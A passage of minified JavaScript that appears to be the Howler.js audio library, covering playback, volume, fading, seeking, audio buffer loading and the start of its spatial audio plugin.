      return o ? (e._src = o, e._state = "loading", "https:" === window.location.protocol && "http:" === o.slice(0, 5) && (e._html5 = !0, e._webAudio = !1), new t(e), e._webAudio && a(e), e) : void e._emit("loaderror", null, "No codec support for selected audio sources.");
    },
    play: function (e, o) {
      var t = this,
        r = null;
      if ("number" == typeof e) r = e, e = null;else {
        if ("string" == typeof e && "loaded" === t._state && !t._sprite[e]) return null;
        if (void 0 === e && (e = "__default", !t._playLock)) {
          for (var a = 0, u = 0; u < t._sounds.length; u++) t._sounds[u]._paused && !t._sounds[u]._ended && (a++, r = t._sounds[u]._id);
          1 === a ? e = null : r = null;
        }
      }
      var i = r ? t._soundById(r) : t._inactiveSound();
      if (!i) return null;
      if (r && !e && (e = i._sprite || "__default"), "loaded" !== t._state) {
        i._sprite = e, i._ended = !1;
        var d = i._id;
        return t._queue.push({
          event: "play",
          action: function () {
            t.play(d);
          }
        }), d;
      }
      if (r && !i._paused) return o || t._loadQueue("play"), i._id;
      t._webAudio && n._autoResume();
      var _ = Math.max(0, i._seek > 0 ? i._seek : t._sprite[e][0] / 1e3),
        s = Math.max(0, (t._sprite[e][0] + t._sprite[e][1]) / 1e3 - _),
        l = 1e3 * s / Math.abs(i._rate),
        c = t._sprite[e][0] / 1e3,
        f = (t._sprite[e][0] + t._sprite[e][1]) / 1e3,
        p = !(!i._loop && !t._sprite[e][2]);
      i._sprite = e, i._ended = !1;
      var m = function () {
        i._paused = !1, i._seek = _, i._start = c, i._stop = f, i._loop = p;
      };
      if (_ >= f) return void t._ended(i);
      var v = i._node;
      if (t._webAudio) {
        var h = function () {
          t._playLock = !1, m(), t._refreshBuffer(i);
          var e = i._muted || t._muted ? 0 : i._volume;
          v.gain.setValueAtTime(e, n.ctx.currentTime), i._playStart = n.ctx.currentTime, void 0 === v.bufferSource.start ? i._loop ? v.bufferSource.noteGrainOn(0, _, 86400) : v.bufferSource.noteGrainOn(0, _, s) : i._loop ? v.bufferSource.start(0, _, 86400) : v.bufferSource.start(0, _, s), l !== 1 / 0 && (t._endTimers[i._id] = setTimeout(t._ended.bind(t, i), l)), o || setTimeout(function () {
            t._emit("play", i._id), t._loadQueue();
          }, 0);
        };
        "running" === n.state ? h() : (t._playLock = !0, t.once("resume", h), t._clearTimer(i._id));
      } else {
        var y = function () {
          v.currentTime = _, v.muted = i._muted || t._muted || n._muted || v.muted, v.volume = i._volume * n.volume(), v.playbackRate = i._rate;
          try {
            var r = v.play();
            if (r && "undefined" != typeof Promise && (r instanceof Promise || "function" == typeof r.then) ? (t._playLock = !0, m(), r.then(function () {
              t._playLock = !1, v._unlocked = !0, o || (t._emit("play", i._id), t._loadQueue());
            }).catch(function () {
              t._playLock = !1, t._emit("playerror", i._id, "Playback was unable to start. This is most commonly an issue on mobile devices and Chrome where playback was not within a user interaction."), i._ended = !0, i._paused = !0;
            })) : o || (t._playLock = !1, m(), t._emit("play", i._id), t._loadQueue()), v.playbackRate = i._rate, v.paused) return void t._emit("playerror", i._id, "Playback was unable to start. This is most commonly an issue on mobile devices and Chrome where playback was not within a user interaction.");
            "__default" !== e || i._loop ? t._endTimers[i._id] = setTimeout(t._ended.bind(t, i), l) : (t._endTimers[i._id] = function () {
              t._ended(i), v.removeEventListener("ended", t._endTimers[i._id], !1);
            }, v.addEventListener("ended", t._endTimers[i._id], !1));
          } catch (e) {
            t._emit("playerror", i._id, e);
          }
        };
        "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" === v.src && (v.src = t._src, v.load());
        var g = window && window.ejecta || !v.readyState && n._navigator.isCocoonJS;
        if (v.readyState >= 3 || g) y();else {
          t._playLock = !0;
          var A = function () {
            y(), v.removeEventListener(n._canPlayEvent, A, !1);
          };
          v.addEventListener(n._canPlayEvent, A, !1), t._clearTimer(i._id);
        }
      }
      return i._id;
    },
    pause: function (e) {
      var n = this;
      if ("loaded" !== n._state || n._playLock) return n._queue.push({
        event: "pause",
        action: function () {
          n.pause(e);
        }
      }), n;
      for (var o = n._getSoundIds(e), t = 0; t < o.length; t++) {
        n._clearTimer(o[t]);
        var r = n._soundById(o[t]);
        if (r && !r._paused && (r._seek = n.seek(o[t]), r._rateSeek = 0, r._paused = !0, n._stopFade(o[t]), r._node)) if (n._webAudio) {
          if (!r._node.bufferSource) continue;
          void 0 === r._node.bufferSource.stop ? r._node.bufferSource.noteOff(0) : r._node.bufferSource.stop(0), n._cleanBuffer(r._node);
        } else isNaN(r._node.duration) && r._node.duration !== 1 / 0 || r._node.pause();
        arguments[1] || n._emit("pause", r ? r._id : null);
      }
      return n;
    },
    stop: function (e, n) {
      var o = this;
      if ("loaded" !== o._state || o._playLock) return o._queue.push({
        event: "stop",
        action: function () {
          o.stop(e);
        }
      }), o;
      for (var t = o._getSoundIds(e), r = 0; r < t.length; r++) {
        o._clearTimer(t[r]);
        var a = o._soundById(t[r]);
        a && (a._seek = a._start || 0, a._rateSeek = 0, a._paused = !0, a._ended = !0, o._stopFade(t[r]), a._node && (o._webAudio ? a._node.bufferSource && (void 0 === a._node.bufferSource.stop ? a._node.bufferSource.noteOff(0) : a._node.bufferSource.stop(0), o._cleanBuffer(a._node)) : isNaN(a._node.duration) && a._node.duration !== 1 / 0 || (a._node.currentTime = a._start || 0, a._node.pause(), a._node.duration === 1 / 0 && o._clearSound(a._node))), n || o._emit("stop", a._id));
      }
      return o;
    },
    mute: function (e, o) {
      var t = this;
      if ("loaded" !== t._state || t._playLock) return t._queue.push({
        event: "mute",
        action: function () {
          t.mute(e, o);
        }
      }), t;
      if (void 0 === o) {
        if ("boolean" != typeof e) return t._muted;
        t._muted = e;
      }
      for (var r = t._getSoundIds(o), a = 0; a < r.length; a++) {
        var u = t._soundById(r[a]);
        u && (u._muted = e, u._interval && t._stopFade(u._id), t._webAudio && u._node ? u._node.gain.setValueAtTime(e ? 0 : u._volume, n.ctx.currentTime) : u._node && (u._node.muted = !!n._muted || e), t._emit("mute", u._id));
      }
      return t;
    },
    volume: function () {
      var e,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) return t._volume;
      if (1 === r.length || 2 === r.length && void 0 === r[1]) {
        t._getSoundIds().indexOf(r[0]) >= 0 ? o = parseInt(r[0], 10) : e = parseFloat(r[0]);
      } else r.length >= 2 && (e = parseFloat(r[0]), o = parseInt(r[1], 10));
      var a;
      if (!(void 0 !== e && e >= 0 && e <= 1)) return a = o ? t._soundById(o) : t._sounds[0], a ? a._volume : 0;
      if ("loaded" !== t._state || t._playLock) return t._queue.push({
        event: "volume",
        action: function () {
          t.volume.apply(t, r);
        }
      }), t;
      void 0 === o && (t._volume = e), o = t._getSoundIds(o);
      for (var u = 0; u < o.length; u++) (a = t._soundById(o[u])) && (a._volume = e, r[2] || t._stopFade(o[u]), t._webAudio && a._node && !a._muted ? a._node.gain.setValueAtTime(e, n.ctx.currentTime) : a._node && !a._muted && (a._node.volume = e * n.volume()), t._emit("volume", a._id));
      return t;
    },
    fade: function (e, o, t, r) {
      var a = this;
      if ("loaded" !== a._state || a._playLock) return a._queue.push({
        event: "fade",
        action: function () {
          a.fade(e, o, t, r);
        }
      }), a;
      e = parseFloat(e), o = parseFloat(o), t = parseFloat(t), a.volume(e, r);
      for (var u = a._getSoundIds(r), i = 0; i < u.length; i++) {
        var d = a._soundById(u[i]);
        if (d) {
          if (r || a._stopFade(u[i]), a._webAudio && !d._muted) {
            var _ = n.ctx.currentTime,
              s = _ + t / 1e3;
            d._volume = e, d._node.gain.setValueAtTime(e, _), d._node.gain.linearRampToValueAtTime(o, s);
          }
          a._startFadeInterval(d, e, o, t, u[i], void 0 === r);
        }
      }
      return a;
    },
    _startFadeInterval: function (e, n, o, t, r, a) {
      var u = this,
        i = n,
        d = o - n,
        _ = Math.abs(d / .01),
        s = Math.max(4, _ > 0 ? t / _ : t),
        l = Date.now();
      e._fadeTo = o, e._interval = setInterval(function () {
        var r = (Date.now() - l) / t;
        l = Date.now(), i += d * r, i = Math.max(0, i), i = Math.min(1, i), i = Math.round(100 * i) / 100, u._webAudio ? e._volume = i : u.volume(i, e._id, !0), a && (u._volume = i), (o < n && i <= o || o > n && i >= o) && (clearInterval(e._interval), e._interval = null, e._fadeTo = null, u.volume(o, e._id), u._emit("fade", e._id));
      }, s);
    },
    _stopFade: function (e) {
      var o = this,
        t = o._soundById(e);
      return t && t._interval && (o._webAudio && t._node.gain.cancelScheduledValues(n.ctx.currentTime), clearInterval(t._interval), t._interval = null, o.volume(t._fadeTo, e), t._fadeTo = null, o._emit("fade", e)), o;
    },
    loop: function () {
      var e,
        n,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) return t._loop;
      if (1 === r.length) {
        if ("boolean" != typeof r[0]) return !!(o = t._soundById(parseInt(r[0], 10))) && o._loop;
        e = r[0], t._loop = e;
      } else 2 === r.length && (e = r[0], n = parseInt(r[1], 10));
      for (var a = t._getSoundIds(n), u = 0; u < a.length; u++) (o = t._soundById(a[u])) && (o._loop = e, t._webAudio && o._node && o._node.bufferSource && (o._node.bufferSource.loop = e, e && (o._node.bufferSource.loopStart = o._start || 0, o._node.bufferSource.loopEnd = o._stop)));
      return t;
    },
    rate: function () {
      var e,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) o = t._sounds[0]._id;else if (1 === r.length) {
        var a = t._getSoundIds(),
          u = a.indexOf(r[0]);
        u >= 0 ? o = parseInt(r[0], 10) : e = parseFloat(r[0]);
      } else 2 === r.length && (e = parseFloat(r[0]), o = parseInt(r[1], 10));
      var i;
      if ("number" != typeof e) return i = t._soundById(o), i ? i._rate : t._rate;
      if ("loaded" !== t._state || t._playLock) return t._queue.push({
        event: "rate",
        action: function () {
          t.rate.apply(t, r);
        }
      }), t;
      void 0 === o && (t._rate = e), o = t._getSoundIds(o);
      for (var d = 0; d < o.length; d++) if (i = t._soundById(o[d])) {
        t.playing(o[d]) && (i._rateSeek = t.seek(o[d]), i._playStart = t._webAudio ? n.ctx.currentTime : i._playStart), i._rate = e, t._webAudio && i._node && i._node.bufferSource ? i._node.bufferSource.playbackRate.setValueAtTime(e, n.ctx.currentTime) : i._node && (i._node.playbackRate = e);
        var _ = t.seek(o[d]),
          s = (t._sprite[i._sprite][0] + t._sprite[i._sprite][1]) / 1e3 - _,
          l = 1e3 * s / Math.abs(i._rate);
        !t._endTimers[o[d]] && i._paused || (t._clearTimer(o[d]), t._endTimers[o[d]] = setTimeout(t._ended.bind(t, i), l)), t._emit("rate", i._id);
      }
      return t;
    },
    seek: function () {
      var e,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) o = t._sounds[0]._id;else if (1 === r.length) {
        var a = t._getSoundIds(),
          u = a.indexOf(r[0]);
        u >= 0 ? o = parseInt(r[0], 10) : t._sounds.length && (o = t._sounds[0]._id, e = parseFloat(r[0]));
      } else 2 === r.length && (e = parseFloat(r[0]), o = parseInt(r[1], 10));
      if (void 0 === o) return t;
      if ("loaded" !== t._state || t._playLock) return t._queue.push({
        event: "seek",
        action: function () {
          t.seek.apply(t, r);
        }
      }), t;
      var i = t._soundById(o);
      if (i) {
        if (!("number" == typeof e && e >= 0)) {
          if (t._webAudio) {
            var d = t.playing(o) ? n.ctx.currentTime - i._playStart : 0,
              _ = i._rateSeek ? i._rateSeek - i._seek : 0;
            return i._seek + (_ + d * Math.abs(i._rate));
          }
          return i._node.currentTime;
        }
        var s = t.playing(o);
        s && t.pause(o, !0), i._seek = e, i._ended = !1, t._clearTimer(o), t._webAudio || !i._node || isNaN(i._node.duration) || (i._node.currentTime = e);
        var l = function () {
          t._emit("seek", o), s && t.play(o, !0);
        };
        if (s && !t._webAudio) {
          var c = function () {
            t._playLock ? setTimeout(c, 0) : l();
          };
          setTimeout(c, 0);
        } else l();
      }
      return t;
    },
    playing: function (e) {
      var n = this;
      if ("number" == typeof e) {
        var o = n._soundById(e);
        return !!o && !o._paused;
      }
      for (var t = 0; t < n._sounds.length; t++) if (!n._sounds[t]._paused) return !0;
      return !1;
    },
    duration: function (e) {
      var n = this,
        o = n._duration,
        t = n._soundById(e);
      return t && (o = n._sprite[t._sprite][1] / 1e3), o;
    },
    state: function () {
      return this._state;
    },
    unload: function () {
      for (var e = this, o = e._sounds, t = 0; t < o.length; t++) o[t]._paused || e.stop(o[t]._id), e._webAudio || (e._clearSound(o[t]._node), o[t]._node.removeEventListener("error", o[t]._errorFn, !1), o[t]._node.removeEventListener(n._canPlayEvent, o[t]._loadFn, !1), n._releaseHtml5Audio(o[t]._node)), delete o[t]._node, e._clearTimer(o[t]._id);
      var a = n._howls.indexOf(e);
      a >= 0 && n._howls.splice(a, 1);
      var u = !0;
      for (t = 0; t < n._howls.length; t++) if (n._howls[t]._src === e._src || e._src.indexOf(n._howls[t]._src) >= 0) {
        u = !1;
        break;
      }
      return r && u && delete r[e._src], n.noAudio = !1, e._state = "unloaded", e._sounds = [], e = null, null;
    },
    on: function (e, n, o, t) {
      var r = this,
        a = r["_on" + e];
      return "function" == typeof n && a.push(t ? {
        id: o,
        fn: n,
        once: t
      } : {
        id: o,
        fn: n
      }), r;
    },
    off: function (e, n, o) {
      var t = this,
        r = t["_on" + e],
        a = 0;
      if ("number" == typeof n && (o = n, n = null), n || o) for (a = 0; a < r.length; a++) {
        var u = o === r[a].id;
        if (n === r[a].fn && u || !n && u) {
          r.splice(a, 1);
          break;
        }
      } else if (e) t["_on" + e] = [];else {
        var i = Object.keys(t);
        for (a = 0; a < i.length; a++) 0 === i[a].indexOf("_on") && Array.isArray(t[i[a]]) && (t[i[a]] = []);
      }
      return t;
    },
    once: function (e, n, o) {
      var t = this;
      return t.on(e, n, o, 1), t;
    },
    _emit: function (e, n, o) {
      for (var t = this, r = t["_on" + e], a = r.length - 1; a >= 0; a--) r[a].id && r[a].id !== n && "load" !== e || (setTimeout(function (e) {
        e.call(this, n, o);
      }.bind(t, r[a].fn), 0), r[a].once && t.off(e, r[a].fn, r[a].id));
      return t._loadQueue(e), t;
    },
    _loadQueue: function (e) {
      var n = this;
      if (n._queue.length > 0) {
        var o = n._queue[0];
        o.event === e && (n._queue.shift(), n._loadQueue()), e || o.action();
      }
      return n;
    },
    _ended: function (e) {
      var o = this,
        t = e._sprite;
      if (!o._webAudio && e._node && !e._node.paused && !e._node.ended && e._node.currentTime < e._stop) return setTimeout(o._ended.bind(o, e), 100), o;
      var r = !(!e._loop && !o._sprite[t][2]);
      if (o._emit("end", e._id), !o._webAudio && r && o.stop(e._id, !0).play(e._id), o._webAudio && r) {
        o._emit("play", e._id), e._seek = e._start || 0, e._rateSeek = 0, e._playStart = n.ctx.currentTime;
        var a = 1e3 * (e._stop - e._start) / Math.abs(e._rate);
        o._endTimers[e._id] = setTimeout(o._ended.bind(o, e), a);
      }
      return o._webAudio && !r && (e._paused = !0, e._ended = !0, e._seek = e._start || 0, e._rateSeek = 0, o._clearTimer(e._id), o._cleanBuffer(e._node), n._autoSuspend()), o._webAudio || r || o.stop(e._id, !0), o;
    },
    _clearTimer: function (e) {
      var n = this;
      if (n._endTimers[e]) {
        if ("function" != typeof n._endTimers[e]) clearTimeout(n._endTimers[e]);else {
          var o = n._soundById(e);
          o && o._node && o._node.removeEventListener("ended", n._endTimers[e], !1);
        }
        delete n._endTimers[e];
      }
      return n;
    },
    _soundById: function (e) {
      for (var n = this, o = 0; o < n._sounds.length; o++) if (e === n._sounds[o]._id) return n._sounds[o];
      return null;
    },
    _inactiveSound: function () {
      var e = this;
      e._drain();
      for (var n = 0; n < e._sounds.length; n++) if (e._sounds[n]._ended) return e._sounds[n].reset();
      return new t(e);
    },
    _drain: function () {
      var e = this,
        n = e._pool,
        o = 0,
        t = 0;
      if (!(e._sounds.length < n)) {
        for (t = 0; t < e._sounds.length; t++) e._sounds[t]._ended && o++;
        for (t = e._sounds.length - 1; t >= 0; t--) {
          if (o <= n) return;
          e._sounds[t]._ended && (e._webAudio && e._sounds[t]._node && e._sounds[t]._node.disconnect(0), e._sounds.splice(t, 1), o--);
        }
      }
    },
    _getSoundIds: function (e) {
      var n = this;
      if (void 0 === e) {
        for (var o = [], t = 0; t < n._sounds.length; t++) o.push(n._sounds[t]._id);
        return o;
      }
      return [e];
    },
    _refreshBuffer: function (e) {
      var o = this;
      return e._node.bufferSource = n.ctx.createBufferSource(), e._node.bufferSource.buffer = r[o._src], e._panner ? e._node.bufferSource.connect(e._panner) : e._node.bufferSource.connect(e._node), e._node.bufferSource.loop = e._loop, e._loop && (e._node.bufferSource.loopStart = e._start || 0, e._node.bufferSource.loopEnd = e._stop || 0), e._node.bufferSource.playbackRate.setValueAtTime(e._rate, n.ctx.currentTime), o;
    },
    _cleanBuffer: function (e) {
      var o = this,
        t = n._navigator && n._navigator.vendor.indexOf("Apple") >= 0;
      if (n._scratchBuffer && e.bufferSource && (e.bufferSource.onended = null, e.bufferSource.disconnect(0), t)) try {
        e.bufferSource.buffer = n._scratchBuffer;
      } catch (e) {}
      return e.bufferSource = null, o;
    },
    _clearSound: function (e) {
      /MSIE |Trident\//.test(n._navigator && n._navigator.userAgent) || (e.src = "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA");
    }
  };
  var t = function (e) {
    this._parent = e, this.init();
  };
  t.prototype = {
    init: function () {
      var e = this,
        o = e._parent;
      return e._muted = o._muted, e._loop = o._loop, e._volume = o._volume, e._rate = o._rate, e._seek = 0, e._paused = !0, e._ended = !0, e._sprite = "__default", e._id = ++n._counter, o._sounds.push(e), e.create(), e;
    },
    create: function () {
      var e = this,
        o = e._parent,
        t = n._muted || e._muted || e._parent._muted ? 0 : e._volume;
      return o._webAudio ? (e._node = void 0 === n.ctx.createGain ? n.ctx.createGainNode() : n.ctx.createGain(), e._node.gain.setValueAtTime(t, n.ctx.currentTime), e._node.paused = !0, e._node.connect(n.masterGain)) : (e._node = n._obtainHtml5Audio(), e._errorFn = e._errorListener.bind(e), e._node.addEventListener("error", e._errorFn, !1), e._loadFn = e._loadListener.bind(e), e._node.addEventListener(n._canPlayEvent, e._loadFn, !1), e._node.src = o._src, e._node.preload = "auto", e._node.volume = t * n.volume(), e._node.load()), e;
    },
    reset: function () {
      var e = this,
        o = e._parent;
      return e._muted = o._muted, e._loop = o._loop, e._volume = o._volume, e._rate = o._rate, e._seek = 0, e._rateSeek = 0, e._paused = !0, e._ended = !0, e._sprite = "__default", e._id = ++n._counter, e;
    },
    _errorListener: function () {
      var e = this;
      e._parent._emit("loaderror", e._id, e._node.error ? e._node.error.code : 0), e._node.removeEventListener("error", e._errorFn, !1);
    },
    _loadListener: function () {
      var e = this,
        o = e._parent;
      o._duration = Math.ceil(10 * e._node.duration) / 10, 0 === Object.keys(o._sprite).length && (o._sprite = {
        __default: [0, 1e3 * o._duration]
      }), "loaded" !== o._state && (o._state = "loaded", o._emit("load"), o._loadQueue()), e._node.removeEventListener(n._canPlayEvent, e._loadFn, !1);
    }
  };
  var r = {},
    a = function (e) {
      var n = e._src;
      if (r[n]) return e._duration = r[n].duration, void d(e);
      if (/^data:[^;]+;base64,/.test(n)) {
        for (var o = atob(n.split(",")[1]), t = new Uint8Array(o.length), a = 0; a < o.length; ++a) t[a] = o.charCodeAt(a);
        i(t.buffer, e);
      } else {
        var _ = new XMLHttpRequest();
        _.open("GET", n, !0), _.withCredentials = e._xhrWithCredentials, _.responseType = "arraybuffer", _.onload = function () {
          var n = (_.status + "")[0];
          if ("0" !== n && "2" !== n && "3" !== n) return void e._emit("loaderror", null, "Failed loading audio file with status: " + _.status + ".");
          i(_.response, e);
        }, _.onerror = function () {
          e._webAudio && (e._html5 = !0, e._webAudio = !1, e._sounds = [], delete r[n], e.load());
        }, u(_);
      }
    },
    u = function (e) {
      try {
        e.send();
      } catch (n) {
        e.onerror();
      }
    },
    i = function (e, o) {
      var t = function () {
          o._emit("loaderror", null, "Decoding audio data failed.");
        },
        a = function (e) {
          e && o._sounds.length > 0 ? (r[o._src] = e, d(o, e)) : t();
        };
      "undefined" != typeof Promise && 1 === n.ctx.decodeAudioData.length ? n.ctx.decodeAudioData(e).then(a).catch(t) : n.ctx.decodeAudioData(e, a, t);
    },
    d = function (e, n) {
      n && !e._duration && (e._duration = n.duration), 0 === Object.keys(e._sprite).length && (e._sprite = {
        __default: [0, 1e3 * e._duration]
      }), "loaded" !== e._state && (e._state = "loaded", e._emit("load"), e._loadQueue());
    },
    _ = function () {
      if (n.usingWebAudio) {
        try {
          "undefined" != typeof AudioContext ? n.ctx = new AudioContext() : "undefined" != typeof webkitAudioContext ? n.ctx = new webkitAudioContext() : n.usingWebAudio = !1;
        } catch (e) {
          n.usingWebAudio = !1;
        }
        n.ctx || (n.usingWebAudio = !1);
        var e = /iP(hone|od|ad)/.test(n._navigator && n._navigator.platform),
          o = n._navigator && n._navigator.appVersion.match(/OS (\d+)_(\d+)_?(\d+)?/),
          t = o ? parseInt(o[1], 10) : null;
        if (e && t && t < 9) {
          var r = /safari/.test(n._navigator && n._navigator.userAgent.toLowerCase());
          (n._navigator && n._navigator.standalone && !r || n._navigator && !n._navigator.standalone && !r) && (n.usingWebAudio = !1);
        }
        n.usingWebAudio && (n.masterGain = void 0 === n.ctx.createGain ? n.ctx.createGainNode() : n.ctx.createGain(), n.masterGain.gain.setValueAtTime(n._muted ? 0 : 1, n.ctx.currentTime), n.masterGain.connect(n.ctx.destination)), n._setup();
      }
    };
  "function" == typeof define && define.amd && define([], function () {
    return {
      Howler: n,
      Howl: o
    };
  }), "undefined" != typeof exports && (exports.Howler = n, exports.Howl = o), "undefined" != typeof window ? (window.HowlerGlobal = e, window.Howler = n, window.Howl = o, window.Sound = t) : "undefined" != typeof global && (global.HowlerGlobal = e, global.Howler = n, global.Howl = o, global.Sound = t);
}();
/*! Spatial Plugin */
!function () {
  "use strict";

  HowlerGlobal.prototype._pos = [0, 0, 0], HowlerGlobal.prototype._orientation = [0, 0, -1, 0, 1, 0], HowlerGlobal.prototype.stereo = function (e) {
    var n = this;
    if (!n.ctx || !n.ctx.listener) return n;
    for (var t = n._howls.length - 1; t >= 0; t--) n._howls[t].stereo(e);
    return n;
  }, HowlerGlobal.prototype.pos = function (e, n, t) {
    var r = this;
    return r.ctx && r.ctx.listener ? (n = "number" != typeof n ? r._pos[1] : n, t = "number" != typeof t ? r._pos[2] : t, "number" != typeof e ? r._pos : (r._pos = [e, n, t], void 0 !== r.ctx.listener.positionX ? (r.ctx.listener.positionX.setTargetAtTime(r._pos[0], Howler.ctx.currentTime, .1), r.ctx.listener.positionY.setTargetAtTime(r._pos[1], Howler.ctx.currentTime, .1), r.ctx.listener.positionZ.setTargetAtTime(r._pos[2], Howler.ctx.currentTime, .1)) : r.ctx.listener.setPosition(r._pos[0], r._pos[1], r._pos[2]), r)) : r;
  }, HowlerGlobal.prototype.orientation = function (e, n, t, r, o, i) {
    var a = this;
    if (!a.ctx || !a.ctx.listener) return a;
    var s = a._orientation;
    return n = "number" != typeof n ? s[1] : n, t = "number" != typeof t ? s[2] : t, r = "number" != typeof r ? s[3] : r, o = "number" != typeof o ? s[4] : o, i = "number" != typeof i ? s[5] : i, "number" != typeof e ? s : (a._orientation = [e, n, t, r, o, i], void 0 !== a.ctx.listener.forwardX ? (a.ctx.listener.forwardX.setTargetAtTime(e, Howler.ctx.currentTime, .1), a.ctx.listener.forwardY.setTargetAtTime(n, Howler.ctx.currentTime, .1), a.ctx.listener.forwardZ.setTargetAtTime(t, Howler.ctx.currentTime, .1), a.ctx.listener.upX.setTargetAtTime(e, Howler.ctx.currentTime, .1), a.ctx.listener.upY.setTargetAtTime(n, Howler.ctx.currentTime, .1), a.ctx.listener.upZ.setTargetAtTime(t, Howler.ctx.currentTime, .1)) : a.ctx.listener.setOrientation(e, n, t, r, o, i), a);
  }, Howl.prototype.init = function (e) {
    return function (n) {
      var t = this;
      return t._orientation = n.orientation || [1, 0, 0], t._stereo = n.stereo || null, t._pos = n.pos || null, t._pannerAttr = {
        coneInnerAngle: void 0 !== n.coneInnerAngle ? n.coneInnerAngle : 360,
        coneOuterAngle: void 0 !== n.coneOuterAngle ? n.coneOuterAngle : 360,
        coneOuterGain: void 0 !== n.coneOuterGain ? n.coneOuterGain : 0,
        distanceModel: void 0 !== n.distanceModel ? n.distanceModel : "inverse",
        maxDistance: void 0 !== n.maxDistance ? n.maxDistance : 1e4,
        panningModel: void 0 !== n.panningModel ? n.panningModel : "HRTF",
        refDistance: void 0 !== n.refDistance ? n.refDistance : 1,
        rolloffFactor: void 0 !== n.rolloffFactor ? n.rolloffFactor : 1
      }, t._onstereo = n.onstereo ? [{
        fn: n.onstereo
      }] : [], t._onpos = n.onpos ? [{
        fn: n.onpos
      }] : [], t._onorientation = n.onorientation ? [{
        fn: n.onorientation
      }] : [], e.call(this, n);
    };
  }(Howl.prototype.init), Howl.prototype.stereo = function (n, t) {
    var r = this;
    if (!r._webAudio) return r;
    if ("loaded" !== r._state) return r._queue.push({
      event: "stereo",
      action: function () {
        r.stereo(n, t);
      }
    }), r;
    var o = void 0 === Howler.ctx.createStereoPanner ? "spatial" : "stereo";
    if (void 0 === t) {
      if ("number" != typeof n) return r._stereo;
      r._stereo = n, r._pos = [n, 0, 0];
    }
    for (var i = r._getSoundIds(t), a = 0; a < i.length; a++) {
      var s = r._soundById(i[a]);
      if (s) {
        if ("number" != typeof n) return s._stereo;
        s._stereo = n, s._pos = [n, 0, 0], s._node && (s._pannerAttr.panningModel = "equalpower", s._panner && s._panner.pan || e(s, o), "spatial" === o ? void 0 !== s._panner.positionX ? (s._panner.positionX.setValueAtTime(n, Howler.ctx.currentTime), s._panner.positionY.setValueAtTime(0, Howler.ctx.currentTime), s._panner.positionZ.setValueAtTime(0, Howler.ctx.currentTime)) : s._panner.setPosition(n, 0, 0) : s._panner.pan.setValueAtTime(n, Howler.ctx.currentTime)), r._emit("stereo", s._id);
      }
    }
    return r;
  }, Howl.prototype.pos = function (n, t, r, o) {
    var i = this;
    if (!i._webAudio) return i;
    if ("loaded" !== i._state) return i._queue.push({
      event: "pos",
      action: function () {
        i.pos(n, t, r, o);
      }
    }), i;
    if (t = "number" != typeof t ? 0 : t, r = "number" != typeof r ? -.5 : r, void 0 === o) {
      if ("number" != typeof n) return i._pos;
      i._pos = [n, t, r];
    }
    for (var a = i._getSoundIds(o), s = 0; s < a.length; s++) {
      var p = i._soundById(a[s]);
      if (p) {
        if ("number" != typeof n) return p._pos;
        p._pos = [n, t, r], p._node && (p._panner && !p._panner.pan || e(p, "spatial"), void 0 !== p._panner.positionX ? (p._panner.positionX.setValueAtTime(n, Howler.ctx.currentTime), p._panner.positionY.setValueAtTime(t, Howler.ctx.currentTime), p._panner.positionZ.setValueAtTime(r, Howler.ctx.currentTime)) : p._panner.setPosition(n, t, r)), i._emit("pos", p._id);
      }
    }
    return i;
  }, Howl.prototype.orientation = function (n, t, r, o) {
    var i = this;
    if (!i._webAudio) return i;
    if ("loaded" !== i._state) return i._queue.push({
      event: "orientation",
      action: function () {
        i.orientation(n, t, r, o);
      }
    }), i;
    if (t = "number" != typeof t ? i._orientation[1] : t, r = "number" != typeof r ? i._orientation[2] : r, void 0 === o) {
      if ("number" != typeof n) return i._orientation;
      i._orientation = [n, t, r];
    }
    for (var a = i._getSoundIds(o), s = 0; s < a.length; s++) {
      var p = i._soundById(a[s]);
      if (p) {
        if ("number" != typeof n) return p._orientation;
        p._orientation = [n, t, r], p._node && (p._panner || (p._pos || (p._pos = i._pos || [0, 0, -.5]), e(p, "spatial")), void 0 !== p._panner.orientationX ? (p._panner.orientationX.setValueAtTime(n, Howler.ctx.currentTime), p._panner.orientationY.setValueAtTime(t, Howler.ctx.currentTime), p._panner.orientationZ.setValueAtTime(r, Howler.ctx.currentTime)) : p._panner.setOrientation(n, t, r)), i._emit("orientation", p._id);
      }
    }
    return i;
  }, Howl.prototype.pannerAttr = function () {
    var n,
      t,
      r,
      o = this,
      i = arguments;
    if (!o._webAudio) return o;
    if (0 === i.length) return o._pannerAttr;
    if (1 === i.length) {
      if ("object" != typeof i[0]) return r = o._soundById(parseInt(i[0], 10)), r ? r._pannerAttr : o._pannerAttr;
      n = i[0], void 0 === t && (n.pannerAttr || (n.pannerAttr = {
        coneInnerAngle: n.coneInnerAngle,
        coneOuterAngle: n.coneOuterAngle,
        coneOuterGain: n.coneOuterGain,
        distanceModel: n.distanceModel,
        maxDistance: n.maxDistance,
        refDistance: n.refDistance,
        rolloffFactor: n.rolloffFactor,
        panningModel: n.panningModel
      }), o._pannerAttr = {
        coneInnerAngle: void 0 !== n.pannerAttr.coneInnerAngle ? n.pannerAttr.coneInnerAngle : o._coneInnerAngle,
        coneOuterAngle: void 0 !== n.pannerAttr.coneOuterAngle ? n.pannerAttr.coneOuterAngle : o._coneOuterAngle,
        coneOuterGain: void 0 !== n.pannerAttr.coneOuterGain ? n.pannerAttr.coneOuterGain : o._coneOuterGain,
        distanceModel: void 0 !== n.pannerAttr.distanceModel ? n.pannerAttr.distanceModel : o._distanceModel,
        maxDistance: void 0 !== n.pannerAttr.maxDistance ? n.pannerAttr.maxDistance : o._maxDistance,
        refDistance: void 0 !== n.pannerAttr.refDistance ? n.pannerAttr.refDistance : o._refDistance,
        rolloffFactor: void 0 !== n.pannerAttr.rolloffFactor ? n.pannerAttr.rolloffFactor : o._rolloffFactor,
        panningModel: void 0 !== n.pannerAttr.panningModel ? n.pannerAttr.panningModel : o._panningModel
      });
    } else 2 === i.length && (n = i[0], t = parseInt(i[1], 10));
    for (var a = o._getSoundIds(t), s = 0; s < a.length; s++) if (r = o._soundById(a[s])) {
      var p = r._pannerAttr;
      p = {
